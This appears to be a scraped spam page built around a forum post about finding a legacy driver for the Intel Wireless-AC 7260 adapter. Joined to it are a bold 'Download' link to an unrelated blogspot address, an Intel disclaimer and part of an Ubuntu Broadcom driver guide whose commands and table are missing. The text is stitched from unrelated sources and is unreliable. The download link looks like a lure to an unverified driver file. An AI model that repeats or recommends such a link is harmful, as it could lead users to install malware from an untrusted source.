
 
Hi guys,

My internet provider has given me a router which runs at 802.11ax but my laptop doesn't find the network. My laptop uses a wireless adapter of the model mentioned in the title - Intel Dual Band Wireless-AC 7260.
The version of the model is 18.33.5.1 since 10/9/2016.

I saw a presentation from Intel saying that the driver 18.33.13.4 is supposed to fix it.

I saw a few similar questions circulating around but those drivers are never published so this is my last resort to recover my internet access at home. My Internet provider already lost money because they thought the issue was in their router, which is why they sent me a second one.

Could please a good-hearted person share with me that driver or if you know a better one which may still be compatible with my wireless adapter?

Kind regards,
Konstantin
 
I am going to reply to myself now :D.

Firstly, I wanna say thanks to Mr Scott Pearson and of course myself for finding the relevant page because after 4 days of "agony" I finally managed to connect to my internet. Without it my laptop was just a box of locked potential. Again, second time, thanks to the posts of the gentleman mentioned.

For anyone banging his head against the wall with the same issue, you can find help here, if you go to the original post with the link:
 -Dual-Band-wireless-ac-7260-drivers/m-p/1498076#M48357

I am sure that with some reading you will manage to find the solution to your problem there.

Next, for Intel, I have some constructive criticism, regarding their policy for drivers. It is a completely wrong policy, business decision if you will, on that front. The fact on the table is that many people still need that driver. Legacy drivers are produced by a manufacturer and should be distributed by that same manufacturer. Otherwise, the manufacturer takes decisions on the behalf of users for when to force them to buy a new device because the old one suddenly shuts down even though it is technically in a good shape.

To add to that, the user support service in that regard is also completely useless because they point people like me to other manufacturers, such as the one who built my laptop. If you fast-forward, you don't even need to try following the advice because our manufacturer will most likely tell us to contact the manufacturer of the corresponding component - in this case wi-fi adapter - Intel. So we go back here.
This is not an issue of the person carrying out user support in Intel, this is an issue of the limitations imposed on the people who provide those services. They could perfectly well for instance distribute drivers. Just give me the link. Let me agree with the risks, that it is old piece of software, etc...
One more point about user support. It shouldn't create a situation in which the most favorable solution for a customer of getting drivers to be a 3rd party because if Intel cannot supply its customers the right tools where else can they look for? If the choice before the customer becomes to burn $1000+ to replace a fully working machine with new one or to find drivers from dodgy sources. Clearly dodgy sources is bad.

I want to point out that actually I am a person with good level of understanding in computing and I absolutely don't see how with respect the average elderly person could sort out an the issue like that on their own. Because for anyone to do so, they should be able to themselves find out that the issue is exactly in the driver. Diagnosing the issue was half the solution and it definitely wasn't self-evident. It is far from straight forward. My internet provider, actually lost money because they were thinking that the issue is a defect in their router, so they sent me a new one - the router as a product is an expense, the logistics of delivering it, too. We have spent hours doing all sorts of settings to the routers and to my network adapter, them, me...

Lastly, what happens if Mr Pearson did no decide or was not allowed (depending on how that works) to help people by providing them that key piece of software? Everyone with a similar problem depends on him. Rhetoric question, 300+ customers of yours get entirely cut out of using they otherwise probably perfectly good machines due to poor decision making. There is no estimate of how many people fail to resolve the issue themselves or how many reach to buying external devices...

To be objective, at the end of the day yes, user support directed me here, yes I got my driver from Intel, yes my machine works, yes I am finally (very) happy. But, my internet provider lost money, I lost time, and Mr Pearson (again many thanks) has been absolutely overloaded with helping people in a similar situation and your user support probably are not over the moon by the fact that they cannot provide provide people with direct solutions.

I understand that what I am writing absolutely doesn't mater but I want to thank the gentleman again, the user guy for directing me to Intel Community, too. If anything changes for the good, super. That's exactly my point and exactly why I took the time to write this piece of feedback.
Overall, it is either a not well a though through process or a complete failure in decision making if it was.

I hope this response helps others, too.

Kind regards,
Me
 
**Download ===> [https://oraselic.blogspot.com/?d=2A0SJW](https://oraselic.blogspot.com/?d=2A0SJW)**


 
Intel does not verify all solutions, including but not limited to any file transfers that may appear in this community. Accordingly, Intel disclaims all express and implied warranties, including without limitation, the implied warranties of merchantability, fitness for a particular purpose, and non-infringement, as well as any warranty arising from course of performance, course of dealing, or usage in trade.
 
This answer is based on an extensive research done by various Ubuntu users that worked together in almost all issues related to Broadcom. Special thanks to chili555 who helped in the Ubuntu forums and on this site with many questions related to Wireless devices and to others who have contributed through E-Mail, chats, IRC and more in testing various drivers with several of the most popular Broadcom Wireless cards (Huge Thanks to Chili555 really. This guy knows his stuff).
 
In total we wanted to offer an answer that could be easy to follow and covered most Broadcom Cards / Drivers. After you follow this guide, you will **NEED** to test your wireless connection for at least 2 hours (I actually recommend 8 hours) with another device in either Ad-Hoc Mode, Infrastructure Mode or Both. Common problems that will be solved (Apart from drivers not installing) are:
 
There are dozens of Broadcom wireless cards and more seem to appear every day. The key to finding the correct driver for any network card is what is known as the **PCI ID** (PCI.ID). To find out which PCI.ID you have, we proceed to opening the terminal by pressing CTRL+ALT+T (It should open a window with a blank background) and inside this terminal we run the following command:
 
The PCI.ID in this example is **14e4:4320** as seen inside the Brackets [...]. In some cases you will also need the revision version (if it appears) for some special cases. In this case, the revision version is **rev 03** as shown inside the Parentheses (...) at the end. So what you will need after this search is:
 
With this new information you can look in the table below and select the appropriate method to install your driver. For example, In this case, since you have the **14e4:4320 rev 03**, if we go down the list to the one that shows the exact same PCI.ID you will see that in the columns for Ubuntu 18.04 or 20.04 it shows the firmware-b43-installer package driver. This means that you will only have to install this particular package since it appears in all Ubuntu version columns.
 
**NOTE** - Before proceeding, if you have previously installed any drivers, have blacklisted or uncommented any driver files or configuration files or have done any changes whatsoever to the system to make the drivers work in previous attempts, you will need to undo them in order to follow this guide. We assume you are doing this from scratch and have not changed any configuration files, modules or drivers in the system in any way (apart from updating the system). This includes any installations using apt-get, aptitude, synaptic, dpkg, software center or manual compilation and installation of the packages. The system has to start from scratch in order for this to work and to avoid any conflicts that may appear if earlier work was done.

Now using the PCI.ID you found in the steps above, we then search in the list below to find the matching PCI.ID and the method to install the driver associated with it in a simple and correct way. The terminal will be used to avoid any GUI related issues. This applies with all cases, except as noted. The installation procedure is done only via terminal and also while connected to the internet with a temporary wired ethernet connection or USB modem or any means possible that can give your PC, for the time, Internet access. After you find in the list below the correct package we then proceed with the installation.
 
Assuming you used the PCI.ID **14e4:4320 rev 03** as found in your search above, and then looked at the table below and found that the correct package to install is the firmware-b43-installer (Specific to Broadcom) and the linux-firmware (Carries over Broadcom related drivers along with other types of drivers), we then proceed to simply install this package in the terminal:
 
For All cases, always install the linux-firmware package if it is an option on the table above for that particular Broadcom Card. This will always be up-to-date with the latest Broadcom drivers along with other binary files that could be needed depending on the driver PCIID.
 a2f82b0cb4
 
